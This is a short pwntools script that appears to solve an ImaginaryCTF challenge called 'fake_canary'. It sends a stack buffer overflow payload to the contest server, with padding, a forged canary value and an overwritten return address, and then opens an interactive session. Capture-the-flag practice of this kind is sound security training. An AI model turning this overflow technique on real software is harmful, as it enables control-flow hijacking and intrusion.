from pwn import *

context.log_level='debug'

#p = process('./fake_canary')
p = remote('chal.imaginaryctf.org',42002)

payload = b'A'*40
payload += p64(0xdeadbeef)
payload += b'A'*8
payload += p64(0x400729)

p.sendafter('What\'s your name?', payload)
p.interactive()
